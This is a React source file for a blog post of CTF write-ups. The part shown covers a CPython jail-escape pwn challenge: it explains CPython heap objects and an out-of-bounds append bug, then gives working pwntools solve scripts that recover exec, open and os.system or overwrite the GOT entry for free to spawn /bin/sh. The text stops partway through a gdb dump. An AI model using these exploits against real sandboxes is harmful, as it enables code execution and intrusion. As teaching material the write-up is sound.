import '../Blogposts.css'
import githubicon from '../assets/github-icon.png';
import { HashLink } from 'react-router-hash-link';
import { FaArrowLeft } from "react-icons/fa";
import { MdCalendarToday } from "react-icons/md";
import { Link } from 'react-router-dom';
import { BlockMath, InlineMath } from "react-katex";
import "katex/dist/katex.min.css";
import { Terminal, Download, CodeBlock } from '../Components.jsx';
import scripturesHint from "../assets/blahajctf-2025/scriptures-hint.png";
import scripturesSolved from "../assets/blahajctf-2025/scriptures-solved.png";
import blsOsint from "../assets/blahajctf-2025/bls-osint.png";
import catsRevenge from "../assets/blahajctf-2025/cats-revenge.png";

function BlahajCTF2025Writeups() {
    return (
        <>
            <nav>
                <div className='navbar'>
                    <ol className='navbar-sitelist'>
                        <li><Link to='/'>Home</Link></li>
                        <li><HashLink to="/#blog">Posts</HashLink></li>
                    </ol>
                </div>
            </nav>
            <div className='blogpost'>
                <div className='home'>
                    <Link to={'/'}>
                        <FaArrowLeft size='1.1rem' className='left-arrow'/>Back to Home
                    </Link>
                </div>
                <div className='title'>BlahajCTF 2025 Writeups</div>
                <div className='subtitle'>
                    <div className='date'><MdCalendarToday size='1.4rem'/>5 Mar 2026</div>
                    <div className='blogpost-tags'>
                        <div className='blogpost-tag'>CTF</div>
                        <div className='blogpost-tag'>Crypto</div>
                        <div className='blogpost-tag'>Web</div>
                        <div className='blogpost-tag'>Pwn</div>
                    </div>
                </div>
                <div className='content'>
                    <h1>Contents</h1>
                    <ol style={{paddingLeft:'2vw'}}>
                        <li><HashLink to="#foreword">Foreword</HashLink></li>
                        <li><HashLink to="#pwn">Pwn</HashLink></li>
                        <ol style={{paddingLeft:'2vw'}}>
                            <li><HashLink to="#python-pwn">Python Pwn</HashLink></li>
                        </ol>
                        <li><HashLink to="#web">Web</HashLink></li>
                        <ol style={{paddingLeft:'2vw'}}>
                            <li><HashLink to="#scriptures">Scriptures</HashLink></li>
                        </ol>
                        <li><HashLink to="#crypto">Crypto</HashLink></li>
                        <ol style={{paddingLeft:'2vw'}}>
                            <li><HashLink to="#baconlettucesalami">baconlettucesalami</HashLink></li>
                            <li><HashLink to="#cats-revenge">cats revenge</HashLink></li>
                            <li><HashLink to="#roblox">roblox</HashLink></li>
                        </ol>
                        <li><HashLink to="#conclusion">Conclusion</HashLink></li>
                    </ol>
                    <br></br>






                    <h1 id='foreword'>Foreword</h1>
                    <p>
                        In December 2025, my friends and I participated in the annual BlahajCTF, which is a local CTF. We managed to qualify for the finals and I, as usual, had a blast playing. During the CTF, I managed to solve all but one crypto challenge (with that one being roblox), as well as a large portion of the misc challenges. In this writeup, I will detail my solve for the hardest crypto challenges, as well as a few other challenges that I upsolved along the way. This is going to be a very long blogpost, so feel free to grab your morning coffee or something and enjoy the read.
                    </p>
                    <br></br>






                    <h1 id='pwn'>Pwn</h1>
                    <h2>Foreword</h2>
                    <p>During the CTF, I managed to solve...<i>drumroll please...</i>zero pwn challenges! This was largely due to the fact that I was so fixated on crypto (and afterwards misc), so I did not even look at the category. Regardless, this CTF had extremely fun (and hard) pwn challenges, with three labelled as expected insane and two labelled as expected hard, and I am writing up on one of the insane ones.</p>
                    <br></br>
                    <h2 id='python-pwn'>Python Pwn</h2>
                    <p><i>python pwn but this time it's actually real pwn</i></p>
                    <p>Author: fern</p>
                    <br></br>
                    <h3>Foreword</h3>
                    <p>This CTF had two CPython pwn challenges (both labelled with an expected difficulty of insane), and this was the easier one. This was my first CPython pwn challenge that I solved, and I definitely enjoyed and learnt a lot from solving it! There are three solutions that I have found, which are my own solution, a standard python pwn solution, and the author's solution. I will be explaining all three solutions. Without further ado, let's get into it.</p>
                    <br></br>
                    <h3>The Challenge</h3>
                    <Download filepath='downloads/blahajctf-2025/pypwn.zip' filename='dist.zip'/>
                    <br></br>
                    <p>In this challenge, we are given a ton of files, most of which to help us debug. There are two relevant files, which are <code className='code'>chall.py</code> and <code className='code'>my_arrays.c</code>. Let's take a look at them.</p>
                    <br></br>
                    <CodeBlock collapsible={true} collapseDefault={false} data={[{'name':'chall.py','language':'python','startingLineNumber':1,'code':`from my_arrays import *
import base64, ast

class SecurityError(Exception):
    pass

class SecurityVisitor(ast.NodeVisitor):
    FORBIDDEN_BUILTINS = {
        'getattr', 'setattr', 'delattr', 'hasattr',
        'eval', 'exec', '__import__', 'open'
    }

    def visit_Attribute(self, node):
        """Blocks direct attribute access like 'obj.attr'."""
        try:
            forbidden_code = ast.unparse(node)
        except AttributeError:
            forbidden_code = f".{node.attr}"
        
        raise SecurityError(
            f"Attribute access is forbidden. "
            f"Found '{forbidden_code}' on line {node.lineno}."
        )

    def visit_Call(self, node):
        if isinstance(node.func, ast.Name) and node.func.id in self.FORBIDDEN_BUILTINS:
            raise SecurityError(
                f"Calling the built-in function '{node.func.id}' is forbidden."
            )
        self.generic_visit(node)



def to_little_endian_bytes(n):
    n &= (1 << 64) - 1
    return bytes(((n >> (8 * i)) & 0xFF) for i in range(8))
def from_little_endian_bytes(b):
    assert len(b) == 8
    n = 0
    for i in range(8):
        n |= (b[i] & 0xFF) << (8 * i)
    return n
def system_append(l, d):
    l.append(d)

def safe_exec_with_printer(code_string: str):
    try:
        tree = ast.parse(code_string)
        visitor = SecurityVisitor()
        visitor.visit(tree)
    except SyntaxError as e:
        print(f"Error: Invalid Python syntax. {e}")
        return
    except SecurityError as e:
        print(f"Execution blocked! {e}")
        return
    except Exception as e:
        print(f"An unexpected error occurred during security analysis: {e}")
        return
    allowed_globals = {
        '__builtins__': {},
        'range': range,
        'id': id,
        'list': list,
        'set': set,
        'bytearray': bytearray,
        'str': str,
        'int': int,
        'len': len,
        'input': input,
        'print': print,
        'hex': hex,
        'system_append': system_append,
        'bytes': bytes,
        'myexit': myexit,
        'my_append': my_append,
        'my_set': my_set,
        'exit': exit,
        'to_little_endian_bytes': to_little_endian_bytes,
        'from_little_endian_bytes': from_little_endian_bytes,
        'True': True,
        'False': False,
        'None': None,
    }

    local_namespace = {}
    exec(code_string, allowed_globals, local_namespace)

try:       
    b64 = input("Please enter base64 script: ").encode("ascii")
except EOFError:
    exit(0)

safe_exec_with_printer(base64.b64decode(b64).decode("charmap"))`},








{'name':'my_arrays.c','language':'c','startingLineNumber':1,'code':`#define PY_SSIZE_T_CLEAN
#include <Python.h>
#include <listobject.h>

static PyObject* my_set(PyObject* self, PyObject* args) {
    PyObject* pList;
    Py_ssize_t index;
    PyObject* pNewItem;
    if (!PyArg_ParseTuple(args, "OnO", &pList, &index, &pNewItem)) {
        return NULL;
    }
    if (!PyList_Check(pList)) {
        PyErr_SetString(PyExc_TypeError, "First argument must be a list.");
        return NULL;
    }
    PyListObject* pListObj = (PyListObject*)pList;
    Py_ssize_t size = Py_SIZE(pListObj);
    if (index < 0 || index >= size) {
        PyErr_SetString(PyExc_IndexError, "list assignment index out of range");
        return NULL;
    }
    PyObject* pOldItem = pListObj->ob_item[index];
    Py_INCREF(pNewItem);
    pListObj->ob_item[index] = pNewItem;
    Py_RETURN_NONE;
}

static PyObject* my_append(PyObject* self, PyObject* args) {
    PyObject* pList;
    PyObject* pNewItem;
    if (!PyArg_ParseTuple(args, "OO", &pList, &pNewItem)) {
        return NULL;
    }
    if (!PyList_Check(pList)) {
        PyErr_SetString(PyExc_TypeError, "First argument must be a list.");
        return NULL;
    }
    PyListObject* pListObj = (PyListObject*)pList;
    Py_ssize_t size = Py_SIZE(pListObj);
    Py_INCREF(pNewItem);
    Py_SET_SIZE(pListObj, size + 1);
    pListObj->ob_item[size] = pNewItem;
    Py_RETURN_NONE;
}

static PyObject* myexit(PyObject* self, PyObject* args) {
    exit(0);
}


static PyMethodDef MyMethods[] = {
    {"my_set", my_set, METH_VARARGS, ""},
    {"my_append", my_append, METH_VARARGS, ""},
    {"myexit", myexit, METH_VARARGS, ""},
    {NULL, NULL, 0, NULL}
};

static struct PyModuleDef my_arrays_module = {
    PyModuleDef_HEAD_INIT,
    "my_arrays",
    "",
    -1,
    MyMethods
};

PyMODINIT_FUNC PyInit_my_arrays(void) {
    return PyModule_Create(&my_arrays_module);
}`}]}></CodeBlock>
                    <br></br>
                    <p>Firstly, <code className='code'>chall.py</code> gives us a pyjail with almost all builtins gone and attribute access blocked, evidently impossible, requiring us to use the unsafe modules included. AST also blocks select builtins from appearing in the code, i.e. <code className='code'>getattr</code>, <code className='code'>setattr</code>, <code className='code'>delattr</code>, <code className='code'>hasattr</code>, <code className='code'>eval</code>, <code className='code'>exec</code>, <code className='code'>__import__</code>, and <code className='code'>open</code>.</p>
                    <br></br>
                    <p>On the other hand, <code className='code'>my_arrays.c</code> gives us three functions to accomplish different things, which are <code className='code'>my_set</code>, <code className='code'>my_append</code> and <code className='code'>my_exit</code>. They are re-implementations of <code className='code'>list[idx] = value</code>, <code className='code'>append</code> and <code className='code'>exit</code> respectively.</p>
                    <br></br>
                    <p>Let's run <code className='code'>checksec</code> on the python binary.</p>
                    <br></br>
                    <Terminal text = {`$ checksec ./python3.11
[*] '/Users/Water/python3.11'
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        No PIE (0x3ff000)
    RUNPATH:    b'.'
    FORTIFY:    Enabled`}/>
                    <br></br>
                    <p>PIE is disabled, and full RELRO is also disabled, meaning we can overwrite the GOT.</p>
                    <br></br>
                    <p>With this in mind, we need to find our end goal. While there is no flag file in the distribution, the Dockerfile shows that the flag file is named flag.txt.</p>
                    <br></br>
                    <h3>Environment Setup</h3>
                    <p>In the challenge distribution, there is a readme file. I'll display it below.</p>
                    <br></br>
                    <p>NOTE:</p>
                    <p>The python3.11 executable <b>will</b> try to look in your system directories for python dependencies, and will throw an error if it is incompatible. For best results and to prevent any unexpected surprise, unless you are using Python 3.11 with Debian 12 (what the docker is using, and what i used to write the chal), please please use the docker provided.</p>
                    <br></br>
                    <p>Also, a tip: you can install  <code className='code'>libc6-dbg</code> package to get debugging symbol with your libc in the docker image.</p>
                    <br></br>
                    <p>The readme is pretty self-explanatory. We can get a shell in the docker container by running <code className='code'>docker run --rm -it &lt;image-name&gt; sh</code>. With that being said, I did not need debug symbols on my libc, but instead on the python executable, so that I could display CPython object fields. Below are some steps to compile python with debug symbols:</p>
                    <ol style={{paddingLeft:'2vw'}}>
                        <li>Download the Gzipped source tarball file from the python installation. The installation for python 3.11.2 can be found <a href='https://www.python.org/downloads/release/python-3112/'>here</a>.</li>
                        <li>Untar the file using <code className='code'>tar -xf Python3.11.2.tgz</code> and <code className='code'>cd</code> into the new directory.</li>
                        <li>Run <code className='code'>./configure --with-pydebug --prefix=/directory/you/want/to/install/python/in</code>. I would recommend creating a new directory to install python in as there are many files that will be installed.</li>
                        <li>Run <code className='code'>make install</code>.</li>
                        <li>Python with debug symbols should be installed in <code className='code'>directory/bin/python3.11d</code>. Note that object addresses are not the same between the compiled python and the one used in the challenge, and additionally, PIE is enabled, so it is important to ensure that we are not using the wrong version for exploitation.</li>
                    </ol>
                    <br></br>
                    <h3>CPython Internals</h3>
                    <p>Before exploiting, let's take a look at the CPython internals.</p>
                    <br></br>
                    <h3>The python heap</h3>
                    <p>Python uses a heap to store almost all its objects (with one of the exceptions being integers from -5 to 256 inclusive, which are cached in memory). For allocations more than or equal to 512 bytes, python uses <code className='code'>malloc</code> and <code className='code'>free</code> on the normal glibc heap. As for allocations less than 512 bytes, python has its own heap and memory allocation functions that are separate from the glibc heap. Similarly to the glibc heap, the python heap has many details. However, as most of it is unnecessary to solve the challenge, I will skip it and just treat it as a normal heap with a freelist.</p>
                    <br></br>
                    <h3>Python Objects</h3>
                    <p>In python, functions, types, variables etc. are all objects. We recall that each object has a datatype (e.g. <code className='code'>[]</code> has a datatype of <code className='code'>list</code>). This results in some "hierarchy" between objects.</p>
                    <br></br>
                    <p>Each object has a header, as well as other fields unique to the object type. I will get into the specific fields later. For now, it is important to note that all fields in the header/body are 8 bytes (on 64-bit python, which we are using) long, and they lie next to each other on the heap.</p>
                    <br></br>
                    <p>With that being said, let's take a look at some important python objects. The fields of python objects can be found using python debug symbols, while the field meanings are in the python documentation (C API section). We can also look at the python source code to find the fields, but I chose to use gdb as it is, in my opinion, more convenient.</p>
                    <br></br>
                    <h4>PyObject and PyVarObject</h4>
                    <p>Every object is an extension of either <code className='code'>PyObject</code> or <code className='code'>PyVarObject</code>, and <code className='code'>PyVarObject</code> itself is an extension of <code className='code'>PyObject</code>. This means that at the start of every object, there will either be a <code className='code'>PyObject</code> or a <code className='code'>PyVarObject</code> header.</p>
                    <br></br>
                    <p>Let's take a look at the fields of <code className='code'>PyObject</code>. Since every object is an extension of it, we can just define any object and print it as an instance of a <code className='code'>PyObject</code>. This truncates all the other object data. Here's a snippet of how to do it.</p>
                    <br></br>
                    <Terminal text={`$ gdb ./python3.11d
<gdb startup message>
Reading symbols from ./python3.11d...
gef> r
Starting program: /Users/Water/python3.11d 
Python 3.11.2 (main, Mar  1 2026, 11:04:14) [GCC 12.2.0] on linux
Type "help", "copyright", "credits" or "license" for more information.
>>> a = []
>>> hex(id(a))
0x7ffff788ed00
>>> ^C
Program received signal SIGINT, Interrupt.
<gdb debug info>
gef> p *(PyObject*)0x7ffff788ed00
$1 = {
  ob_refcnt = 0x1,
  ob_type = 0x555555a0b2c0 <PyList_Type>
}`}></Terminal>
                    <br></br>
                    <p>As we can see, there are two fields in <code className='code'>PyObject</code>. The python documentation is really good for finding out what specific fields in objects are, but for this specific case, it is easily inferrable. Regardless, I will explain what these fields are.</p>
                    <br></br>
                    <p><code className='code'>ob_refcnt</code> stores the reference count (or refcount for short) of the object, as a 64-bit <code className='code'>long</code> in memory. The reference count of an object shows how many objects are "tracking" it. In this example, I only defined the list once in the code, so the refcount is 1. If I were to run something like <code className='code'>str(a)</code>, the refcount would increase momentarily while that function is called. If the refcount is 0, the object gets freed from the heap.</p>
                    <br></br>
                    <p><code className='code'>ob_type</code> stores the type of the object. Each type object lies in memory as an instance of <code className='code'>PyTypeObject</code>, which I will be going into later. The <code className='code'>ob_type</code> field stores a pointer to the <code className='code'>PyTypeObject</code>.</p>
                    <br></br>
                    <p>Now that we've understood <code className='code'>PyObject</code>, let's take a look at <code className='code'>PyVarObject</code>.</p>
                    <br></br>
                    <Terminal text={`gef> p *(PyVarObject*)0x7ffff788ed00
$2 = {
  ob_base = {
    ob_refcnt = 0x1,
    ob_type = 0x555555a0b2c0 <PyList_Type>
  },
  ob_size = 0x0
}`}></Terminal>
                    <br></br>
                    <p>As I mentioned earlier, <code className='code'>PyVarObject</code> is an extension of <code className='code'>PyObject</code>, adding the <code className='code'>ob_size</code> field. This is for objects that have some notion of size, such as strings and lists.</p>
                    <br></br>
                    <p>For strings, lists, tuples etc., what lies in the <code className='code'>ob_size</code> field is rather straightforward. However, for some objects like ints (<code className='code'>PyLongObject</code>), it is not straightforward, being the length of the object. I will not elaborate on this as <code className='code'>PyLongObject</code>s have nothing to do with this challenge.</p>
                    <br></br>
                    <h4>PyTypeObject</h4>
                    <p>Every object in python has a type. These types, such as <code className='code'>list</code> and <code className='code'>str</code>, are defined in memory as instances of <code className='code'>PyTypeObject</code>.</p>
                    <br></br>
                    <Terminal text={`gef> p *(PyTypeObject*) 0x555555a0b2c0
$5 = {
  ob_base = {
    ob_base = {
      ob_refcnt = 0x2b,
      ob_type = 0x555555a129c0 <PyType_Type>
    },
    ob_size = 0x0
  },
  tp_name = 0x5555558b8974 "list",
  tp_basicsize = 0x28,
  ...
  tp_vectorcall = 0x5555556f88f7 <list_vectorcall>
}`}></Terminal>
                    <br></br>
                    <p><code className='code'>PyTypeObject</code> is an extension of <code className='code'>PyVarObject</code>, as indicated by the presence of the <code className='code'>ob_size</code> field. Said field is used when classes are defined in the code, but it is irrelevant for our use. As seen above, it is just 0.</p>
                    <br></br>
                    <p>Other than the header, the object only consists of the <code className='code'>tp_xxx</code> fields. This is the "vtable" (not the proper name, but functionally the same) of any python objects with this type. When a function is called on the object, e.g. <code className='code'>str(obj)</code>, the function that the corresponding entry in the vtable points to will be called. The type object page in the python documentation is a good resource to check which vtable entries correspond to which function.</p>
                    <br></br>
                    <h4>PyListObject</h4>
                    <p>This is the main object that we are dealing with in this challenge, as the library functions operate on lists.</p>
                    <br></br>
                    <Terminal text={`gef> p *(PyListObject*) 0x7ffff788ed00
$7 = {
  ob_base = {
    ob_base = {
      ob_refcnt = 0x1,
      ob_type = 0x555555a0b2c0 <PyList_Type>
    },
    ob_size = 0x2
  },
  ob_item = 0x7ffff7c30fa0,
  allocated = 0x2
}`}></Terminal>
                    <br></br>
                    <p><code className='code'>PyListObject</code> is an extension of <code className='code'>PyVarObject</code>, as there is a notion of size. I'll just jump straight into explaining the fields.</p>
                    <br></br>
                    <p><code className='code'>ob_item</code> is a pointer to the external buffer of the list, which is stored in a different region of memory (but still in the heap). As lists are mutable, the contents are stored in an external buffer instead of in the list objects themselves.</p>
                    <br></br>
                    <p><code className='code'>allocated</code> is the number of qwords that are allocated for the list buffer. When defined, <code className='code'>ob_size</code> qwords are initially allocated. When any operation that increases the length of the list is called, this is the allocation formula: <code className='code'>{'new_allocated = (newsize + (newsize >> 3) + 6) & ~3'}</code>, where <code className='code'>newsize</code> is the new number of elements in the list, and arithmetic takes place in <code className='code'>size_t</code> i.e. 64-bit unsigned integers. This formula can be found in the python source code <a href='https://github.com/python/cpython/blob/5ea9010e8910cb97555c3aef4ed95cca93a74aab/Objects/listobject.c#L132'>here</a>.</p>
                    <br></br>
                    <p>Let's take a look at the list buffer.</p>
                    <br></br>
                    <Terminal text={`gef> p *(PyListObject*) 0x7ffff788ed00
$7 = {
  ob_base = {
    ob_base = {
      ob_refcnt = 0x1,
      ob_type = 0x555555a0b2c0 <PyList_Type>
    },
    ob_size = 0x2
  },
  ob_item = 0x7ffff7c30fa0,
  allocated = 0x2
}
gef> x/gx 0x7ffff7c30fa0
0x7ffff7c30fa0: 0x0000555555b01f68
gef> p *(PyLongObject*) 0x0000555555b01f68
$8 = {
  ob_base = {
    ob_base = {
      ob_refcnt = 0x3b9acaf7,
      ob_type = 0x555555a0bc60 <PyLong_Type>
    },
    ob_size = 0x1
  },
  ob_digit = {
    [0x0] = 0x1
  }
}`}></Terminal>
                    <br></br>
                    <p>In this gdb session, I defined the list as <code className='code'>[1,2]</code>. As seen above, the list buffer stores pointers to objects, and not the objects themselves. This is useful to know for our exploit later.</p>
                    <br></br>
                    <h4>PyByteArrayObject</h4>
                    <Terminal text={`gef> p *(PyByteArrayObject*) 0x7ffff788f600
$8 = {
  ob_base = {
    ob_base = {
      ob_refcnt = 0x1,
      ob_type = 0x5555559fb760 <PyByteArray_Type>
    },
    ob_size = 0x10
  },
  ob_alloc = 0x11,
  ob_bytes = 0x7ffff7c30fa0 "abcdefghijklmnop",
  ob_start = 0x7ffff7c30fa0 "abcdefghijklmnop",
  ob_exports = 0x0
}`}></Terminal>
                    <br></br>
                    <p>Again, <code className='code'>PyByteArrayObject</code> has a <code className='code'>PyVarObject</code> header, and as it is mutable, it uses an external buffer that is stored in a different section of the heap, similarly to lists. However, the reallocation formula is slightly different. Since it does not concern us, I will not elaborate much. Feel free to read up about it <a href='https://github.com/python/cpython/blob/main/Objects/bytearrayobject.c#L211'>here</a> if you're interested.</p>
                    <br></br>
                    <p><code className='code'>ob_alloc</code> is the same as <code className='code'>PyListObject</code>'s <code className='code'>allocated</code>.</p>
                    <br></br>
                    <p><code className='code'>ob_bytes</code> is the actual start of the bytearray buffer. On the other hand, <code className='code'>ob_start</code> is the "logical start" of the buffer. Let me illustrate with an example. Lets say we define a <code className='code'>b = bytearray('abdefgh','utf-8')</code>, and we do <code className='code'>del b[:b]</code> (must be from the start). If the number of bytes deleted is small enough in comparison to the remaining number of bytes, for efficiency, the bytearray buffer will be kept as it is and <code className='code'>ob_start</code> will move.</p>
                    <br></br>
                    <p><code className='code'>ob_exports</code> is like a refcount, but it is for how many external views there are accessing the bytearray buffer, such as calling <code className='code'>memoryview()</code> on a bytearray. A difference with refcount is that even though this field is zero, the object will not be freed. Additionally, if this field is nonzero, the bytearray cannot be resized or freed.</p>
                    <br></br>
                    
                    <p>Now let's take a look at the bytearray buffer.</p>
                    <br></br>
                    <Terminal text={`gef> x/s 0x7ffff7c30fa0
0x7ffff7c30fa0: "abcdefgh"`}></Terminal>
                    <br></br>
                    <p>The bytearray buffer consits of the raw bytes, which will be useful for our exploitation later.</p>
                    <br></br>
                    <h3>The vulnerability</h3>
                    <p><i>Wipes sweat</i> wow, that was a lot of information! Now we can move on to the challenge itself. Let's take a closer look at the definition for <code className='code'>my_append</code>.</p>
                    <br></br>
                    <CodeBlock collapsible={true} collapseDefault={false} data={[{'name':'my_arrays.c','language':'c','startingLineNumber':1,'code':`static PyObject* my_append(PyObject* self, PyObject* args) {
    PyObject* pList;
    PyObject* pNewItem;
    if (!PyArg_ParseTuple(args, "OO", &pList, &pNewItem)) {
        return NULL;
    }
    if (!PyList_Check(pList)) {
        PyErr_SetString(PyExc_TypeError, "First argument must be a list.");
        return NULL;
    }
    PyListObject* pListObj = (PyListObject*)pList;
    Py_ssize_t size = Py_SIZE(pListObj);
    Py_INCREF(pNewItem);
    Py_SET_SIZE(pListObj, size + 1);
    pListObj->ob_item[size] = pNewItem;
    Py_RETURN_NONE;
}`}]}></CodeBlock>
                    <br></br>
                    <p>Notice that in the entire code, the <code className='code'>allocated</code> field is neither read nor changed. This means that if <code className='code'>{`size > allocated`}</code>, no reallocation happens, and we overflow out of the allocated memory. This is known as an out-of-bounds (OOB) write.</p>
                    <br></br>
                    <p>Note: There is another vulnerability where <code className='code'>my_set</code> does not decrement the refcount of the object it is overwriting, but I did not use it at all.</p>
                    <br></br>
                    <p>From now on, I will be switching to the python binary given in the challenge distribution.</p>
                    <br></br>
                    <h3>Recovering builtins</h3>
                    <p>This is the first (and easiest) of three solutions to the challenge, and it is also the solution that I initially used. This is analogous to <code className='code'>ret2dlresolve</code> in stack pwn. I'll also mention that this solution is a cheese.</p>
                    <br></br>
                    <p>It is easy to see that we can index into a list to gain OOB read, but we need to know what to read.</p>
                    <br></br>
                    <p>Recall that list and bytearray buffers are stored in the same region of memory, and they will be contiguous if there are no previously freed chunks in the freelist to use. We can empty the freelist by spraying lists before we do anything.</p>
                    <br></br>
                    <p>A read to a value we control isn't very useful. However, the bytearray buffer consists of raw bytes, while list buffers consist of pointers. This means that we can dereference pointers and obtain objects we aren't supposed to. Immediately, builtins come to mind.</p>
                    <br></br>
                    <p>I chose to recover <code className='code'>open</code> and <code className='code'>exec</code>. But you might ask, aren't both of these blocked? Well, yes, but they are blocked by parsing the code. Because <code className='code'>ast</code> never actually runs the code, we can just name them some other names and nothing will be flagged. Additionally, attribute access can be done in <code className='code'>exec()</code> as <code className='code'>ast</code> thinks it's a string. This means we can run <code className='code'>open('flag.txt','r').read()</code>.</p>
                    <p>Apparently, <code className='code'>os.system</code> also lies in memory and we can recover that, and it isn't blocked by the challenge.</p>
                    <br></br>
                    <p>The builtins lie in memory at a constant offset from other objects in the same memory region, such as <code className='code'>print</code>, which we have access to, and can find the address using <code className='code'>id()</code>. This is important as the python heap is adjacent to libc in memory, meaning it is affected by ASLR.</p>
                    <p>However, the offset is different within the challenge file and python shell, so I added the builtins I wanted to recover into the allowed list in <code className='code'>chall.py</code>, rebuilt the docker and printed out the addresses, then rebuilt the docker again after reverting <code className='code'>chall.py</code>.</p>
                    <br></br>
                    <p>Here's my solvescript that incorporates both types of builtins recovery.</p>
                    <br></br>
                    <CodeBlock collapsible={true} collapseDefault={true} data={[{'name':'solve.py','language':'python','startingLineNumber':1,'code':`from pwn import *
from base64 import b64encode

code = '''
a = []
for i in range(20):
    system_append(a,[1,2])

execaddr = id(print)-1760
openaddr = id(print)+97264
systemaddr = id(print)+134512

my_append(a[-1],None)

builtins = bytearray(8)

for i in range(8):
    builtins[i] = execaddr % 256
    execaddr >>= 8
exc = a[-1][2]

for i in range(8):
    builtins[i] = openaddr % 256
    openaddr >>= 8
opn = a[-1][2]

for i in range(8):
    builtins[i] = systemaddr % 256
    systemaddr >>= 8
system = a[-1][2]

del a

exc('flag = opn("flag.txt","r").read()')
print(flag,flush=True)
print('-'*30,flush=True)

print('popping shell',flush=True)
system('/bin/sh')
'''
p = remote('localhost',1337)
# p = process(['./python3.11','chal.py'])
p.sendlineafter(b'script: ',b64encode(code.encode()))
p.interactive()`}]}></CodeBlock>
                    <br></br>
                    <p>I'll show the flag at the end of the writeup.</p>
                    <br></br>
                    <h3>GOT Overwrite</h3>
                    <p>This is the author's solution. Notice that full RELRO is disabled so we can overwrite GOT entries.</p>
                    <br></br>
                    <p>In order to overwrite the GOT, we need to upgrade our OOB write to arbwrite. The first step to do this is to overwrite the size of any "container" object so that we have arbread to any object after the buffer/object (depending if the object is mutable or immutable).</p>
                    <br></br>
                    <p>To do this, we first need to place the buffer of our list ever so slightly lower in memory than another object that we control. This was definitely the hardest part of the challenge, and needed a lot of trial and error. We can allocate a list of length 1, use the normal append once to reallocate it (recall that on initialisation, the allocated space is exactly the same as the list length), then define our other object. As a result, the list buffer will be very slightly lower in memory than our other object. I'm not exactly sure why this works, especially because the list buffers are in a different region of memory from the list objects, but I suspect there are some objects that are freed under the hood after we create a list object, adding to the freelist.</p>
                    <p>Additionally, object and buffer addresses relative to ASLR are deterministic, so we can just inspect in gdb to find the address difference between the list buffer and our second object.</p>
                    <br></br>
                    <p>Now that we have an arbitrary write past a certain address, we need to upgrade to arbwrite, as the GOT is quite low in memory. Ideally we want a bytearray, so that we can write raw bytes, and we can also overwrite its buffer address to be a low address in memory. But there's a problem. There are no python objects that have an address lower than the GOT, which is problematic as the list buffer stores pointers to python objects.</p>
                    <br></br>
                    <p>Do we really need to overwrite the buffer though? As it turns out, no. If the bytearray has a length of 0, the buffer address is a null value, which is just 0. And when we overwrite the size, the buffer address does not change. So we can just overwrite the size pointer with an object that has an address larger than the address of what we need to read/write. I picked <code className='code'>print</code>.</p>
                    <br></br>
                    <p>Since PIE is disabled, we can just arbread the GOT for a libc leak, and arbwrite into the GOT. But which function do we overwrite? I initially tried to overwrite <code className='code'>write</code>, which is what python's <code className='code'>print</code> uses, but it did not work. In the end, I picked <code className='code'>free</code>, which will be triggered when we delete an object with a size of at least 512 bytes (so that it is allocated and freed by the glibc heap instead of the python heap). We can just create a bytearray, with contents <code className='code'>/bin/sh\0</code> and another 504 bytes of padding at the end, then delete it.</p>
                    <br></br>
                    <p>Here's my solvescript.</p>
                    <br></br>
                    <CodeBlock collapsible={true} collapseDefault={true} data={[{'name':'solve.py','language':'python','startingLineNumber':1,'code':`from pwn import *
from base64 import b64encode

code = '''
b = [1]
system_append(b,2)
c = bytearray(0)

for _ in range(8):
    my_append(b,bytearray)
my_append(b,print)
assert len(c) == id(print)

freegot = 0x000000948538

leak = 0
for i in range(8):
    leak += (c[freegot+i])*256**i

libcbase = leak-626400
systemaddr = libcbase+0x4c490

for i in range(8):
    c[freegot+i] = systemaddr % 256
    systemaddr >>= 8

rce = bytearray('/bin/sh\\\\0'+'a'*504,'utf-8')
del rce
'''


p = remote('localhost',1337)
# p = process(['./python3.11','chal.py'])
p.sendlineafter(b'script: ',b64encode(code.encode()))
# print(p.recvall().decode().strip())
p.interactive()`}]}></CodeBlock>
                    <br></br>
                    <h3>Overwriting a vtable entry</h3>
                    <p>You may realise that a GOT overwrite may be unreliable, as we have no control of what libc functions CPython calls under the hood. This is where overwriting a vtable entry comes in. Unlike C functions, we have direct control over what functions in a vtable are called. This is the reason why it is a standard CPython pwn solution.</p>
                    <br></br>
                    <p>For starters, we get arbread and arbwrite, like before. Next, let's momentarily go back to take a look at the vtable of <code className='code'>PyList_Type</code>. Lists are great as they have a lot of vtable entries, as opposed to some other objects like bytearrays.</p>
                    <br></br>
                    <Terminal text={`gef> p *(PyTypeObject*) 0x555555a0b2c0
$1 = {
  ob_base = {
    ob_base = {
      ob_refcnt = 0x2c,
      ob_type = 0x555555a129c0 <PyType_Type>
    },
    ob_size = 0x0
  },
  tp_name = 0x5555558b8974 "list",
  tp_basicsize = 0x28,
  tp_itemsize = 0x0,
  tp_dealloc = 0x5555556f6ee9 <list_dealloc>,
  tp_vectorcall_offset = 0x0,
  tp_getattr = 0x0,
  tp_setattr = 0x0,
  tp_as_async = 0x0,
  tp_repr = 0x5555556f6d8e <list_repr>,
  tp_as_number = 0x0,
  tp_as_sequence = 0x555555a0af20 <list_as_sequence>,
  tp_as_mapping = 0x555555a0af00 <list_as_mapping>,
  tp_hash = 0x55555571922f <PyObject_HashNotImplemented>,
  tp_call = 0x0,
  tp_str = 0x55555572b4bf <object_str>,
  tp_getattro = 0x55555571b92a <PyObject_GenericGetAttr>,
  tp_setattro = 0x55555571bdae <PyObject_GenericSetAttr>,
  tp_as_buffer = 0x0,
  tp_flags = 0x2485520,
  tp_doc = 0x5555558b91a0 <list___init____doc__> "list(iterable=(), /)\\n--\\n\\nBuilt-in mutable sequence.\\n\\nIf no argument is given, the constructor creates a new empty list.\\nThe argument must be an iterable if specified.",
  tp_traverse = 0x5555556f2ce5 <list_traverse>,
  tp_clear = 0x5555556f4252 <_list_clear>,
  tp_richcompare = 0x5555556f6957 <list_richcompare>,
  tp_weaklistoffset = 0x0,
  tp_iter = 0x5555556f3db9 <list_iter>,
  tp_iternext = 0x0,
  tp_methods = 0x555555a0b460 <list_methods>,
  tp_members = 0x0,
  tp_getset = 0x0,
  tp_base = 0x555555a12820 <PyBaseObject_Type>,
  tp_dict = 0x7ffff7bec590,
  tp_descr_get = 0x0,
  tp_descr_set = 0x0,
  tp_dictoffset = 0x0,
  tp_init = 0x5555556f89eb <list___init__>,
  tp_alloc = 0x555555733bda <PyType_GenericAlloc>,
  tp_new = 0x55555572b1ef <PyType_GenericNew>,
